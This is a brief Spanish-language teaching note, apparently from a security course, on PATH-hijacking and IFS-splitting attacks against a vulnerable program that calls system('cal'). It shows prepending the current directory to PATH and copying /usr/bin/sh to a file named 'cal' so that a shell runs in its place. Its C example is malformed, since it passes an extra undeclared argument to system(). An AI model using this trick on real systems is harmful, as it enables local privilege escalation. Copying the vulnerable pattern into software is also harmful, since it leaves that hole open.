<!--
 Copyright (C) 2025 José Enrique Vilca Campana
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU Affero General Public License as
 published by the Free Software Foundation, either version 3 of the
 License, or (at your option) any later version.
 
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU Affero General Public License for more details.
 
 You should have received a copy of the GNU Affero General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.
-->

### ataque path o "alias"

Condiciones de uso del programa vulnerable:



PATH=.:$PATH:.

```bash
cp /usr/bin/sh cal
```

```c++
#include <stdlib.h>

int main(){
    system("cal");
    system("/usr/bin/cal", environment);
}
```


```bash
tr '/' ' '
```
usr/bin/cal

```bash
usr bin cal #<executable:usr.exe> <parameters:bin,cal>
```


